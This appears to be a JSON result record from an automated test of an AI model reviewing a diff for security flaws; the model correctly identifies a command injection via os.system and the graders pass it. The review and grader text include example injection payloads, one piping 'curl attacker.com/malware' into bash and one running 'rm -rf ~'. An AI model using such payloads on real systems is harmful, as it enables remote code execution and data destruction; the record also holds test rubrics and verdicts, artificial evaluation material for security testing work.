@@ -1,0 +1,53 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 5,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review Summary\n\nThis diff introduces **critical command injection vulnerabilities**:\n\n**Primary Issue:** The change replaces the secure `subprocess.run()` call (which uses argument list semantics to prevent shell injection) with `os.system()` that concatenates user-controlled values directly into a shell command string. User input from `request.GET` (`infile` and `size`) is passed unsanitized into the command, allowing attackers to inject arbitrary shell commands.\n\n**Attack Example:** An attacker could send `?src=input.png&size=100x100;curl attacker.com/malware|bash` to execute malicious code.\n\n**Secondary Issue:** The added `shlex` import is unused, suggesting this is an obfuscated or incomplete fix attempt that leaves the vulnerability exposed while appearing to address it.\n\nThe diff represents a security regression—it removes safe code and replaces it with a dangerous pattern.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-19T00:43:42.666Z",
+  "durationMs": 30138,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that the diff replaces safe subprocess.run() argument-vector usage with os.system() built from unsanitized request.GET input (size/src), explicitly named it a command injection vulnerability, and gave a concrete malicious payload example demonstrating shell metacharacter injection — matching the rubric's core requirement.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that the diff replaces safe subprocess.run() argument-vector usage with os.system() built from unsanitized request.GET input (size/src), explicitly named it a command injection vulnerability, and gave a concrete malicious payload example demonstrating shell metacharacter injection — matching the rubric's core requirement."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that the diff replaces safe subprocess.run() argument-list execution with os.system() built from a shell string containing unsanitized user input from request.GET (infile/size), explicitly calling it a command injection vulnerability with a concrete exploit example (`size=100x100;curl attacker.com/malware|bash`). This matches the rubric's core requirement; it also noted the unused shlex import but correctly did not treat it as a mitigation, instead calling it an incomplete/obfuscated fix.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that the diff replaces safe subprocess.run() argument-list execution with os.system() built from a shell string containing unsanitized user input from request.GET (infile/size), explicitly calling it a command injection vulnerability with a concrete exploit example (`size=100x100;curl attacker.com/malware|bash`). This matches the rubric's core requirement; it also noted the unused shlex import but correctly did not treat it as a mitigation, instead calling it an incomplete/obfuscated fix."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review Summary\n\nThis diff introduces **critical command injection vulnerabilities**:\n\n**Primary Issue:** The change replaces the secure `subprocess.run()` call (which uses argument list semantics to prevent shell injection) with `os.system()` that concatenates user-controlled values directly into a shell command string. User input from `request.GET` (`infile` and `size`) is passed unsanitized into the command, allowing attackers to inject arbitrary shell commands.\n\n**Attack Example:** An attacker could send `?src=input.png&size=100x100;curl attacker.com/malware|bash` to execute malicious code.\n\n**Secondary Issue:** The added `shlex` import is unused, suggesting this is an obfuscated or incomplete fix attempt that leaves the vulnerability exposed while appearing to address it.\n\nThe diff represents a security regression—it removes safe code and replaces it with a dangerous pattern.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-obfuscated-cmdi.patch' in your current working directory, then review it.",
+      "--allowedTools",
+      "Read Grep Glob",
+      "--strict-mcp-config",
+      "--model",
+      "claude-haiku-4-5"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
